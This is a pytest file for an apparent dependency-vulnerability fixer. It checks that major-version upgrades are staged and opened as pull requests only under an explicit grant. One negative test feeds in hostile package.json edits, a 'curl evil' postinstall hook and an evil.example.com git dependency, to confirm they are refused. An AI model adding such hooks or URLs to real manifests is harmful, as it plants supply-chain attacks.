"""``stage-major``: ``stage-fix`` with semver-major upgrades allowed (2026-10-31, operator decision).

Network-free: OSV, PyPI and npm are stubbed; git is real where the executor is exercised end to end.
"""

from __future__ import annotations

import json
import os
import re
import subprocess
from datetime import UTC, datetime
from pathlib import Path

import pytest

pytest.importorskip("cryptography")
from agentteams.vulnscan import executor, executor_pr, fix, grant, manifests, mcp, npm_major, osv  # noqa: E402
from agentteams.vulnscan import retry_guard  # noqa: E402
from tests.test_vulnscan_executor import (  # noqa: E402
    GIT,
    _assert_refused_cleanly,
    _install,
    _repo_with_remote,
    _sh,
    env,  # noqa: F401  (the shared fixture)
)

BRANCH = re.compile(r"^vulnscan/\d{8}-[0-9a-f]{10}$")   # handoff._BRANCH depends on this form


# ---------------------------------------------------------------- grant

def test_stage_major_is_grantable_but_only_when_named(env: dict) -> None:
    assert "stage-major" in grant.OPS_V1
    with_major = _install(env, ops=["stage-fix", "stage-major"], hosts=[])
    target = str(env["tmp"] / "repos" / "svc")
    assert grant.covers(with_major, "stage-major", target) and grant.covers(with_major, "stage-fix", target)
    without = grant.build(ops=["stage-fix", "open-pr"], repo_roots=[str(env["tmp"] / "repos")], hosts=[], days=1,
                          max_uses=1, key_id="op", governance_dir=str(env["gov"]))
    assert not grant.covers(without, "stage-major", target)   # stage-fix never implies stage-major


@pytest.mark.skipif(not GIT, reason="git not available")
def test_a_grant_without_stage_major_refuses_it(env: dict, monkeypatch: pytest.MonkeyPatch) -> None:
    repo = _repo_with_remote(env["tmp"])
    _install(env, ops=["stage-fix", "open-pr"], hosts=[])
    called: list = []
    monkeypatch.setattr(fix, "fix_path", lambda *a, **k: called.append(k))
    res = executor.act("stage-major", str(repo), env["cfg"], request_id="1" * 32)
    assert res["status"] == "refused" and called == []


# ---------------------------------------------------------------- executor (real git)

def _pip_major(root: Path, **kw: object) -> fix.FixResult:
    _pip_major.kw = kw   # type: ignore[attr-defined]
    req = root / "requirements.txt"
    req.write_text(req.read_text().replace("PyJWT==2.3.0", "PyJWT==3.0.1"))
    return fix.FixResult(changes=[fix.PinChange("requirements.txt", "PyJWT", "2.3.0", "3.0.1", major=True)],
                         applied=True)


def _pip_minor(root: Path, **kw: object) -> fix.FixResult:
    _pip_minor.kw = kw   # type: ignore[attr-defined]
    req = root / "requirements.txt"
    req.write_text(req.read_text().replace("PyJWT==2.3.0", "PyJWT==2.15.0"))
    return fix.FixResult(changes=[fix.PinChange("requirements.txt", "PyJWT", "2.3.0", "2.15.0")], applied=True)


def _commit_message(wt: str) -> str:
    return _sh(Path(wt), "log", "-1", "--format=%B")


@pytest.mark.skipif(not GIT, reason="git not available")
def test_stage_major_stages_a_pip_major_with_a_major_commit(env: dict, monkeypatch: pytest.MonkeyPatch) -> None:
    repo = _repo_with_remote(env["tmp"])
    _install(env, ops=["stage-major"], hosts=[])
    monkeypatch.setattr(fix, "fix_path", _pip_major)
    res = executor.act("stage-major", str(repo), env["cfg"], rationale="GHSA-x high")
    assert res["status"] == "done" and res["major"] is True, res
    assert _pip_major.kw["allow_major"] is True   # type: ignore[attr-defined]
    assert BRANCH.match(res["branch"])
    staged = json.loads(executor.staged_file(repo.resolve()).read_text())
    assert staged["major"] is True and staged["changed"] == ["requirements.txt"]
    msg = _commit_message(staged["worktree"])
    digest = res["branch"].rsplit("-", 1)[-1]
    assert msg.startswith(f"security(deps)!: major upgrade of known-vulnerable dependencies ({digest})\n")
    assert "- PyJWT 2.3.0 → 3.0.1 (requirements.txt)" in msg and "BREAKING CHANGE:" in msg


@pytest.mark.skipif(not GIT, reason="git not available")
def test_stage_fix_is_unchanged(env: dict, monkeypatch: pytest.MonkeyPatch) -> None:
    repo = _repo_with_remote(env["tmp"])
    _install(env, ops=["stage-fix"], hosts=[])
    monkeypatch.setattr(fix, "fix_path", _pip_minor)
    res = executor.act("stage-fix", str(repo), env["cfg"])
    assert res["status"] == "done" and "major" not in res
    assert _pip_minor.kw["allow_major"] is False   # type: ignore[attr-defined]
    staged = json.loads(executor.staged_file(repo.resolve()).read_text())
    assert "major" not in staged and BRANCH.match(staged["branch"])
    digest = staged["branch"].rsplit("-", 1)[-1]
    assert _commit_message(staged["worktree"]).startswith(
        f"security(deps): fix known-vulnerable dependency versions ({digest})\n")


@pytest.mark.skipif(not GIT, reason="git not available")
def test_stage_major_refuses_a_change_with_no_major_upgrade(env: dict, monkeypatch: pytest.MonkeyPatch) -> None:
    repo = _repo_with_remote(env["tmp"])
    _install(env, ops=["stage-major"], hosts=[])
    monkeypatch.setattr(fix, "fix_path", _pip_minor)
    res = executor.act("stage-major", str(repo), env["cfg"], request_id="2" * 32)
    assert res["status"] == "failed" and "no major upgrade" in res["detail"]
    assert not res["detail"].startswith(retry_guard.FUTILE_DETAIL)   # not held: stage-fix is the right op
    _assert_refused_cleanly(repo, "2" * 32)


PKG = '{\n    "name": "app",\n    "dependencies": {\n        "express": "^4.17.1",\n        "lodash": "^4.17.21"\n    },\n' \
      '    "devDependencies": {\n        "vite": "^4.5.0"\n    }\n}\n'


def _lock(express: str, root_express: str = "^4.17.1") -> str:
    return json.dumps({"name": "app", "lockfileVersion": 3, "packages": {
        "": {"name": "app", "dependencies": {"express": root_express, "lodash": "^4.17.21"},
             "devDependencies": {"vite": "^4.5.0"}},
        "node_modules/express": {"version": express,
                                 "resolved": f"https://registry.npmjs.org/express/-/express-{express}.tgz"}}},
        indent=2) + "\n"


def _npm_major_fix(root: Path, **kw: object) -> fix.FixResult:
    (root / "package.json").write_text(PKG.replace('"^4.17.1"', '"^5.0.1"'))
    (root / "package-lock.json").write_text(_lock("5.0.1", "^5.0.1"))
    return fix.FixResult(changes=[fix.PinChange("package.json", "express", "4.17.1", "5.0.1", major=True)],
                         applied=True)


@pytest.mark.skipif(not GIT, reason="git not available")
def test_stage_major_accepts_a_package_json_raise_and_stage_fix_never_does(env: dict,
                                                                            monkeypatch: pytest.MonkeyPatch) -> None:
    repo = _repo_with_remote(env["tmp"], {"package.json": PKG, "package-lock.json": _lock("4.17.1")})
    _install(env, ops=["stage-fix", "stage-major"], hosts=[])
    monkeypatch.setattr(fix, "fix_path", _npm_major_fix)
    res = executor.act("stage-fix", str(repo), env["cfg"], request_id="3" * 32)
    assert res["status"] == "failed" and "package" in res["detail"], res   # the root change, or package.json
    _assert_refused_cleanly(repo, "3" * 32)
    res = executor.act("stage-major", str(repo), env["cfg"])
    assert res["status"] == "done" and sorted(res["changed"]) == ["package-lock.json", "package.json"], res


@pytest.mark.skipif(not GIT, reason="git not available")
@pytest.mark.parametrize("evil", [
    PKG.replace('"name": "app"', '"name": "app", "scripts": {"postinstall": "curl evil"}'),   # another member
    PKG.replace('"^4.17.1"', '"git+https://evil.example.com/express.git"'),                     # not a raise
    PKG.replace('"^4.17.1"', '"^3.0.0"'),                                                       # a downgrade
])
def test_stage_major_refuses_any_other_package_json_change(env: dict, monkeypatch: pytest.MonkeyPatch,
                                                           evil: str) -> None:
    repo = _repo_with_remote(env["tmp"], {"package.json": PKG, "package-lock.json": _lock("4.17.1")})
    _install(env, ops=["stage-major"], hosts=[])

    def evil_fix(root: Path, **kw: object) -> fix.FixResult:
        (root / "package.json").write_text(evil)
        return fix.FixResult(changes=[fix.PinChange("package.json", "express", "4.17.1", "5.0.1", major=True)],
                             applied=True)

    monkeypatch.setattr(fix, "fix_path", evil_fix)
    res = executor.act("stage-major", str(repo), env["cfg"], request_id="4" * 32)
    assert res["status"] == "failed" and "package.json" in res["detail"], res
    _assert_refused_cleanly(repo, "4" * 32)


def test_a_lockfile_root_may_change_only_to_mirror_the_edited_package_json() -> None:
    old, new = _lock("4.17.1"), _lock("5.0.1", "^5.0.1")
    with pytest.raises(ValueError, match="root package dependencies changed"):
        manifests.check_lock_edit("package-lock.json", old, new)
    manifests.check_lock_edit("package-lock.json", old, new, manifest=json.loads(PKG.replace("^4.17.1", "^5.0.1")))
    with pytest.raises(ValueError, match="root package dependencies changed"):
        manifests.check_lock_edit("package-lock.json", old, new, manifest=json.loads(PKG))


# ---------------------------------------------------------------- open-pr for a major change

_GH = """#!/bin/sh
d="$(dirname "$0")"
echo "$@" >> "$d/gh.log"
case "$1 $2" in
  "label create") echo "label already exists" >&2; exit 1 ;;
  "pr list") echo "[]" ;;
  "pr create") case "$*" in
                 *"--label"*) if [ -f "$d/nolabel" ]; then echo "could not add label: 'vulnscan-major' not found" >&2
                                exit 1; fi ;;
               esac
               echo https://github.example.com/o/svc/pull/11 ;;
  *) exit 2 ;;
esac
"""


def _gh(env: dict, monkeypatch: pytest.MonkeyPatch) -> Path:
    bindir = env["tmp"] / "ghbin"
    bindir.mkdir()
    (bindir / "gh").write_text(_GH)
    (bindir / "gh").chmod(0o755)
    monkeypatch.setenv("PATH", f"{bindir}{os.pathsep}{os.environ['PATH']}")
    return bindir


@pytest.mark.skipif(not GIT, reason="git not available")
@pytest.mark.parametrize("label_missing", [False, True])
def test_open_pr_marks_a_major_change(env: dict, monkeypatch: pytest.MonkeyPatch, label_missing: bool) -> None:
    repo = _repo_with_remote(env["tmp"])
    _install(env, ops=["stage-major", "open-pr"], hosts=[])
    monkeypatch.setattr(fix, "fix_path", _pip_major)
    staged = executor.act("stage-major", str(repo), env["cfg"])
    bindir = _gh(env, monkeypatch)
    if label_missing:
        (bindir / "nolabel").write_text("")
    pr = executor.act("open-pr", str(repo), env["cfg"], rationale="GHSA-x")
    assert pr["status"] == "done" and pr["pr"].endswith("/pull/11") and pr["major"] is True, pr
    calls = (bindir / "gh.log").read_text().splitlines()
    digest = staged["branch"].rsplit("-", 1)[-1]
    creates = [c for c in calls if c.startswith("pr create ")]
    assert any(c.startswith(f"label create {executor_pr.MAJOR_LABEL} ") for c in calls)
    assert f"--title security(deps)!: MAJOR upgrade of known-vulnerable dependencies ({digest})" in creates[0]
    assert creates[0].endswith(f"--label {executor_pr.MAJOR_LABEL}")
    assert len(creates) == (2 if label_missing else 1)               # a missing label never fails the PR
    if label_missing:
        assert "--label" not in creates[1]
    body = next(Path(staged["worktree"]).parent.glob("*.pr.md")).read_text()
    assert body.startswith("**MAJOR upgrade.**") and "CI must cover" in body and "code may need changes" in body


def test_pr_text_for_a_non_major_change_is_unchanged() -> None:
    assert executor_pr.title("vulnscan/20261031-abcdef0123", major=False) == \
        "security(deps): fix known-vulnerable dependencies (abcdef0123)"
    assert "MAJOR" not in executor_pr.body("plan", "why", major=False)
    assert executor_pr.commit_args("abc", [], major=False)[1] == \
        "security(deps): fix known-vulnerable dependency versions (abc)"


# ---------------------------------------------------------------- fix_path: pip majors

def test_pip_majors_are_taken_only_with_allow_major(tmp_path: Path, monkeypatch: pytest.MonkeyPatch) -> None:
    then = datetime(2026, 1, 1, tzinfo=UTC)
    monkeypatch.setattr(fix, "_releases", lambda name: [("5.0.0", then), ("6.0.0", then)])
    monkeypatch.setattr(osv, "vulnerable_ids", lambda items: {
        k: ["GHSA-c"] for k in set(items) if k[1] == "Flask-Cors" and k[2] in ("4.0.0", "5.0.0")})
    req = tmp_path / "requirements.txt"
    req.write_text("Flask-Cors==4.0.0\r\nflask>=3\r\n")
    held = fix.fix_path(tmp_path, apply=True, allow_dirty=True)
    assert [(c.action, c.new) for c in held.changes] == [("major-held", "6.0.0")]
    assert "stage-major" in held.changes[0].note and req.read_bytes() == b"Flask-Cors==4.0.0\r\nflask>=3\r\n"
    res = fix.fix_path(tmp_path, apply=True, allow_major=True, allow_dirty=True)
    assert [(c.action, c.new, c.major) for c in res.changes] == [("fix", "6.0.0", True)]
    assert req.read_bytes() == b"Flask-Cors==6.0.0\r\nflask>=3\r\n" and res.resolved == 1
    assert executor_pr.major_changes(res.changes) == res.changes


# ---------------------------------------------------------------- fix_path: npm majors

def _npm_world(tmp: Path, monkeypatch: pytest.MonkeyPatch, *, pkg: str = PKG, transitive: bool = False) -> list:
    """express 4.17.1 (direct) needs 5.0.1; with ``transitive``, qs 6.5.0 (not in package.json) needs 7.0.0."""
    lock = json.loads(_lock("4.17.1"))
    if transitive:
        lock["packages"]["node_modules/qs"] = {"version": "6.5.0",
                                               "resolved": "https://registry.npmjs.org/qs/-/qs-6.5.0.tgz"}
    (tmp / "package.json").write_text(pkg)
    (tmp / "package-lock.json").write_text(json.dumps(lock, indent=2) + "\n")
    fixed = {"express": "5.0.1", "qs": "7.0.0"}
    monkeypatch.setattr(osv, "vulnerable_ids", lambda items: {
        k: [f"GHSA-{k[1]}"] for k in set(items) if (k[1], k[2]) in (("express", "4.17.1"), ("qs", "6.5.0"))})
    monkeypatch.setattr(osv, "minimal_fix", lambda ids, eco, name, ver: (fixed[name], 0))
    real_which, real_run = fix.shutil.which, subprocess.run
    monkeypatch.setattr(fix.shutil, "which", lambda name, *a, **k: "/usr/bin/npm" if name == "npm" else
                        real_which(name, *a, **k))
    calls: list = []

    def run(cmd: list, **kw: object) -> subprocess.CompletedProcess:
        if cmd[0] != "/usr/bin/npm":
            return real_run(cmd, **kw)   # type: ignore[call-overload]
        calls.append(cmd)
        scratch = Path(str(kw["cwd"]))
        if cmd[1] == "install":   # npm re-resolves the lockfile from the rewritten package.json
            spec = json.loads((scratch / "package.json").read_text())["dependencies"]["express"]
            new = json.loads(_lock("5.0.1", spec))
            if transitive:
                new["packages"]["node_modules/qs"] = lock["packages"]["node_modules/qs"]
            (scratch / "package-lock.json").write_text(json.dumps(new, indent=2) + "\n")
        return subprocess.CompletedProcess(cmd, 0, "ok\n", "")

    monkeypatch.setattr(fix.subprocess, "run", run)
    return calls


def test_a_direct_npm_major_rewrites_package_json_and_reresolves_the_lockfile(tmp_path: Path,
                                                                              monkeypatch: pytest.MonkeyPatch) -> None:
    calls = _npm_world(tmp_path, monkeypatch)
    res = fix.fix_path(tmp_path, apply=True, allow_major=True, allow_dirty=True)
    assert (tmp_path / "package.json").read_text() == PKG.replace('"^4.17.1"', '"^5.0.1"')   # formatting kept
    assert [c[1] for c in calls] == ["install", "audit"]
    install = calls[0]
    assert install[1:5] == ["install", "--no-audit", "--package-lock-only", "--ignore-scripts"]
    assert not any(a.startswith("--before") for a in install)   # cooldown 0: no cutoff, as for the audit fix
    [row] = res.changes
    assert (row.path, row.name, row.action, row.major, row.new) == ("package.json", "express", "fix", True, "5.0.1")
    assert res.resolved == 1 and not res.feed_errors
    lock = json.loads((tmp_path / "package-lock.json").read_text())
    assert lock["packages"]["node_modules/express"]["version"] == "5.0.1"
    npm_major.check_package_json_edit("package.json", PKG.encode(), (tmp_path / "package.json").read_bytes())
    manifests.check_lock_edit("package-lock.json", _lock("4.17.1"), json.dumps(lock),
                              manifest=json.loads((tmp_path / "package.json").read_text()))


def test_the_npm_cooldown_reaches_the_install(tmp_path: Path, monkeypatch: pytest.MonkeyPatch) -> None:
    calls = _npm_world(tmp_path, monkeypatch)
    fix.fix_path(tmp_path, apply=True, allow_major=True, allow_dirty=True, cooldown_days=3)
    assert all(any(a.startswith("--before=") for a in c) for c in calls)


def test_a_transitive_npm_major_stays_held(tmp_path: Path, monkeypatch: pytest.MonkeyPatch) -> None:
    calls = _npm_world(tmp_path, monkeypatch, transitive=True)
    res = fix.fix_path(tmp_path, apply=True, allow_major=True, allow_dirty=True)
    rows = {c.name: c for c in res.changes}
    assert rows["express"].action == "fix" and rows["express"].major
    assert rows["qs"].action == "major-held" and not rows["qs"].major and "transitive only" in rows["qs"].note
    assert "qs" not in (tmp_path / "package.json").read_text() and [c[1] for c in calls] == ["install", "audit"]


def test_only_transitive_majors_run_no_install(tmp_path: Path, monkeypatch: pytest.MonkeyPatch) -> None:
    pkg = PKG.replace('"express": "^4.17.1",\n        ', "")
    calls = _npm_world(tmp_path, monkeypatch, pkg=pkg)
    res = fix.fix_path(tmp_path, apply=True, allow_major=True, allow_dirty=True)
    assert [c.action for c in res.changes] == ["major-held"] and "transitive only" in res.changes[0].note
    assert (tmp_path / "package.json").read_text() == pkg and [c[1] for c in calls] == ["audit"]


def test_npm_workspaces_stay_held_under_stage_major(tmp_path: Path, monkeypatch: pytest.MonkeyPatch) -> None:
    pkg = PKG.replace('"name": "app",', '"name": "app",\n    "workspaces": ["packages/*"],')
    calls = _npm_world(tmp_path, monkeypatch, pkg=pkg)
    res = fix.fix_path(tmp_path, apply=True, allow_major=True, allow_dirty=True)
    assert [c.action for c in res.changes] == ["major-held"] and "workspaces" in res.changes[0].note
    assert (tmp_path / "package.json").read_text() == pkg and "install" not in [c[1] for c in calls]


def test_without_allow_major_npm_majors_are_never_touched(tmp_path: Path, monkeypatch: pytest.MonkeyPatch) -> None:
    calls = _npm_world(tmp_path, monkeypatch)
    res = fix.fix_path(tmp_path, apply=True, allow_dirty=True)
    assert res.changes == [] and (tmp_path / "package.json").read_text() == PKG
    assert [c[1] for c in calls] == ["audit"]


def test_rewrite_specs_keeps_every_other_byte() -> None:
    text = '{"a":1,"devDependencies":{"vite" : "~4.5.0"},\t"dependencies": {"vite": "x"}}'
    out = npm_major.rewrite_specs(text, {"vite": ("devDependencies", "^6.0.0")})
    assert out == text.replace('"~4.5.0"', '"^6.0.0"')
    assert npm_major.direct_section(json.loads(PKG), "vite") == "devDependencies"
    assert npm_major.direct_section({"dependencies": {"x": "npm:y@^1"}}, "x") == ""   # an alias is never rewritten


# ---------------------------------------------------------------- retry_guard

def _row(op: str, detail: str) -> dict:
    return {"op": op, "target": "/r/app", "kind": "failed", "detail": detail, "ts": "2026-10-30T12:00:00+00:00"}


def test_futility_holds_are_separate_per_op(monkeypatch: pytest.MonkeyPatch) -> None:
    monkeypatch.setattr(retry_guard, "plan_digest", lambda repo, day=None: "same-plan")
    fix_futile = [_row("stage-fix", retry_guard.FUTILE_DETAIL)]
    assert retry_guard.futile_reason("stage-fix", "/r/app", fix_futile).startswith(retry_guard.HELD_PREFIX)
    assert "stage-major" in retry_guard.futile_reason("stage-fix", "/r/app", fix_futile)   # the hint to escalate
    assert retry_guard.futile_reason("stage-major", "/r/app", fix_futile) == ""
    major_futile = [_row("stage-major", f"{retry_guard.MAJOR_FUTILE_DETAIL}: the change resolves no advisory")]
    assert retry_guard.futile_reason("stage-major", "/r/app", major_futile).startswith(
        f"{retry_guard.HELD_PREFIX}stage-major found {retry_guard.MAJOR_FUTILE_DETAIL}")
    assert retry_guard.futile_reason("stage-fix", "/r/app", major_futile) == ""


def test_stage_major_never_records_the_major_jump_detail(tmp_path: Path, monkeypatch: pytest.MonkeyPatch) -> None:
    monkeypatch.setattr(retry_guard, "nothing_vulnerable", lambda wt: False)
    assert retry_guard.zero_change_detail(tmp_path, "origin/main", refused=False) == retry_guard.FUTILE_DETAIL
    detail = retry_guard.zero_change_detail(tmp_path, "origin/main", refused=False, major=True)
    assert detail == retry_guard.MAJOR_FUTILE_DETAIL and retry_guard.FUTILE_DETAIL not in detail


# ---------------------------------------------------------------- the agent's MCP server

def test_mcp_offers_stage_major_and_refuses_it_for_a_staged_repository(tmp_path: Path) -> None:
    d = {k: tmp_path / k for k in ("run", "requests", "results")}
    for p in d.values():
        p.mkdir()
    (d["run"] / mcp.STAGED_FILE).write_text(json.dumps({"repos": ["/repos/app"]}))
    srv = mcp.Server(d["run"], d["requests"], d["results"])
    assert "stage-major" in mcp.SCHEMAS["request"]["inputSchema"]["properties"]["op"]["enum"]
    assert "major-held" in mcp.SCHEMAS["request"]["description"]
    with pytest.raises(mcp.ToolError, match="already staged.*not stage-major"):
        srv.call("request", {"op": "stage-major", "target": "/repos/app", "rationale": "GHSA-x"})
    rid = srv.call("request", {"op": "stage-major", "target": "/repos/other", "rationale": "GHSA-y"})["id"]
    assert json.loads((d["requests"] / f"{rid}.json").read_text())["op"] == "stage-major"
